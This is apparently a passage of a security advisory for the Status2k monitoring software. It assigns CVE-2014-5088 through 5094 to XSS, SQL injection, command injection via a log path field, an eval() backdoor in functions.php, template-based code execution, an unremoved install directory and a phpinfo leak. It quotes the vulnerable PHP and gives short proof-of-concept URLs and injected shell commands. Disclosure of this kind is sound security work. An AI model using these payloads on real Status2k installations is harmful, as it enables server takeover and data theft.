admin login page, etc
 
login.php:
 
if (isset($_GET[&#039;username&#039;])) { $useren = $_GET[&#039;username&#039;]; }
if (isset($_POST[&#039;password&#039;])) { $useren = $_POST[&#039;username&#039;]; }
$adminuser = $res[&#039;adminuser&#039;]; // Login Database
$cusername = $_COOKIE["S2KUser"];
if ( ($cusername == $adminuser) && ($cpassword == $adminpass) ) { $lgtrue = 1; }
if ( ($useren == $adminuser) && ($passen == $adminpass) ) {
setcookie("S2KUser", $useren);
if ($passen && $useren) {
if ($useren !== $adminuser) { echo &#039;<div class="alert-message error"
                              Username (&#039;.$useren.&#039;) Incorrect.</div&#039;; }
        <input type="text" name="username" size="25" 
 
simple injection can be done in the username field, <scriptalert("poc")</script, etc
 
Use CVE-2014-5088 for all of the XSS issues.
 
 
2. SQLi vulnerability in the GET (log)
param... This isn&#039;t too useful seeing that if you had auth,
much more damage could be done - refer to command injection
lack of sanitization: in /admin/options/logs.php
 
$l = $_GET[&#039;log&#039;];
  $result = mysql_fetch_array($query) or die(mysql_error());
    $result = mysql_fetch_array($query) or die(mysql_error());
    $result = mysql_fetch_array($query) or die(mysql_error());
 
- PoC: site.com/s2kdir/admin/options/logs.php?log=[sqli]
 
Use CVE-2014-5089.
 
 
3. Command injection
This requires access to the Status2k Admin
Panel, log-in and proceed to click the &#039;Logs&#039; tab, then select
&#039;Add Logs&#039;, type in any name and for the &#039;Location&#039; field use
command injection... Then browse to the created log via the &#039;Logs&#039;
tab again.
 
- example: Logs --Add Logs --; then Logs --newly created log
 
Name: test Location: /var/log/dmesg;pwd; uname -a
localhost/admin/options/addlog.php?type=edit&id=5
 
so there&#039;s no sanitization in addlog.php which lets you put anything
you want as a log location... the issue now is that in logs.php:
 
$logc = cmdrun($config[&#039;logcmd&#039;].$result[&#039;location&#039;]);
    $log = explode("\n", $logc);
    $log = array_reverse($log);
 
cmdrun literally calls the equivalent of exec() and thus completely
execution of a command.
 
if it is complaining about dmesg... try other log locations... such as
/usr/local/apache/logs/suexec_log, also try other bash chars, such as
 
| & && ; $(), etc
 
Use CVE-2014-5090.
 
 
4. eval() [RCE] backdoor..
For about a year, status2k.com was hosting a backdoored version
of their software... either they knew it or not, there was never an
announcement when the backdoor was found (good job).
 
in the file /includes/functions.php:
eval($_GET[&#039;multies&#039;]);
 
site.com/s2k/includes/functions.php?multies=inject_php_code here
 
PoC: site.com/s2k/includes/functions.php?multies=echo &#039;foobar&#039;;
 
Use CVE-2014-5091.
 
 
5. Another RCE
status2k also lacks sanitization in the templates; /admin/options/editpl.php
 
one can literally place any malicious php code they want here and have it execute
 
// Let&#039;s make sure the file exists and is writable first.
if (is_writable("../../templates/".$config[&#039;templaten&#039;]."/".$filename)) {
 
    // In our example we&#039;re opening $filename in append mode.
    // The file pointer is at the bottom of the file hence
    // that&#039;s where $somecontent will go when we fwrite() it.
    if (!$handle = fopen("../../templates/".$config[&#039;templaten&#039;]."/".$filename, &#039;w&#039;)) {
         echo "Cannot open file (../../templates/".$config[&#039;templaten&#039;]."/".$filename.")";
         exit;
    }
 
    // Write $somecontent to our opened file.
    if (fwrite($handle, $value) === FALSE) {
        echo "Cannot write to file (../../templates/".$config[&#039;templaten&#039;]."/".$filename.")";
        exit;
    } else {
echo "Success, $filename updated!";
 
once again complete lack of sanitization.
 
Use CVE-2014-5092.
 
 
6. Design flaw by default Status2k does not remove the install
directory (/install/), this may lead to an attacker resetting the
admin credentials and thus logging in and causing further damage
through RCE vectors listed above.
 
Use CVE-2014-5093.
 
 
7. Information leak... it is not shown by default on the index.php
of status2k above version 2, however // PHPINFO ========== //
================== $action = $_GET["action"]; if ($action ==
"phpinfo") { phpinfo(); die(); } allows anyone to view the server&#039;s
phpinfo page (localhost/status/index.php?action=phpinfo)
 
Use CVE-2014-5094.

